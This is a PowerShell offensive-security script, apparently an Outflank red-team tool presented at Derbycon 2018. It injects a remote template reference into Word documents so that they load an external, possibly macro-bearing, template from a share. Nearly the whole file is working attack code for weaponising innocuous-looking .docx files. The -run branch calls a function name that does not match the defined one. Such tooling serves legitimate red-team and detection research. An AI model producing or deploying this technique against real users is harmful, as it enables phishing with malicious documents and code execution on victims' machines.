<#
    Invoke-Templator.ps1
    Author: Pieter Ceelen (@ptr_cln)
    License: BSD 3-Clause

    Goal: Update Template location in Word files so we can mess around with macro payloads. 
    Presented at the MS office magic show @Derbycon 2018, additional details on https://www.outflank.nl/blog

    Either load module and run the InjectTemplate function, or direct from the CLI using the -run parameter
    ./injectTemplate.ps1 -run -templatefile \\file\share\empty.dotm -docfile e:\legit.docx
#>


Param
    (
          [String] $templatefile,
          [String] $docfile,
          [String] $temppath = $env:TEMP,
          [switch] $run
    )
 



function unzip {
  [CmdletBinding()]
    param([string]$FileName,[string]$TempDir )

    Add-Type -Assembly “system.io.compression.filesystem”

    [io.compression.zipfile]::ExtractToDirectory($filename, $tempdir)
}

function  zip{
 [CmdletBinding()]
    param([string]$FileName,[string]$Dir )

    Add-Type -Assembly “system.io.compression.filesystem”

    [io.compression.zipfile]::CreateFromDirectory($Dir, $FileName)

}


function Invoke-Templator {


    Param
        (
              [Parameter(Mandatory=$True)] [String] $templatefile,
              [Parameter(Mandatory=$True)] [String] $docfile,
               [String] $temppath = $env:TEMP
        )
 

    $rnd=Get-Random



    $newdir = new-item -Path $temppath -ItemType "directory" -Name $rnd


    if ( !(test-path $docfile)) {
     write-host "unable to find file $docfile"
     exit
    }

    $ext=$docfile.split(".")[-1]
    if($ext -notin "docm","docx") {
     write-host "please provide a docm or docx as input docfile, not an $ext" 
     exit
    }




    unzip -FileName $docfile -TempDir "$temppath\$rnd"  
    $xmlfile=  "$temppath\$rnd\word\_rels\settings.xml.rels"

    if ( (test-path $xmlfile)) {
        Write-verbose "xmlfile does exist"

        [xml]$xmldata= get-content $xmlfile
        $curTemplate = $xmldata.Relationships.Relationship.Attributes['Target'].Value
        write-host "File $docfile already has an template attached, updating"
         $xmldata.Relationships.Relationship.Attributes['Target'].'#text'="file:///$templatefile"
         $xmldata.save( $xmlfile)


    } else{
        write-verbose "xmlfile is not found, creating a new one in $xmlfile"
        [xml]$xmldata='<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///F:\pieterisdebeste.dot" TargetMode="External"/></Relationships>'
        $xmldata.Relationships.Relationship.Attributes['Target'].'#text'="file:///$templatefile"
         $xmldata.save( $xmlfile)

        write-verbose "xmlfile was not found, adding a reference to our template in word\settings.xml"
         [xml]$settingsdoc= gc "$temppath\$rnd\word\settings.xml"
        $child = $settingsdoc.CreateElement("w","attachedTemplate","http://schemas.openxmlformats.org/wordprocessingml/2006/main")
        $atr = $settingsdoc.CreateAttribute("r","id","http://schemas.openxmlformats.org/officeDocument/2006/relationships")

        $atr.value="rId1"|Out-Null
        $child.Attributes.Append($atr)|Out-Null
        $settingsdoc.settings.appendChild($child)|Out-Null
        $settingsdoc.save("$temppath\$rnd\word\settings.xml")
     
    }

    zip -Dir "$temppath\$rnd\" -FileName "$temppath\$rnd.$ext"

    write-host "created file , now manually run copy '$temppath\$rnd.$ext' '$docfile' "

    remove-item -Path "$temppath\$rnd\" -Recurse
}
 
if($run){
    if($templatefile -and $docfile ) {
        injecttemplate -templatefile $templatefile -docfile $docfile -temppath $temppath
    } else {
        write-host "Error  docfile and templatefile are mandatory when calling with -run"
        exit
    }
}
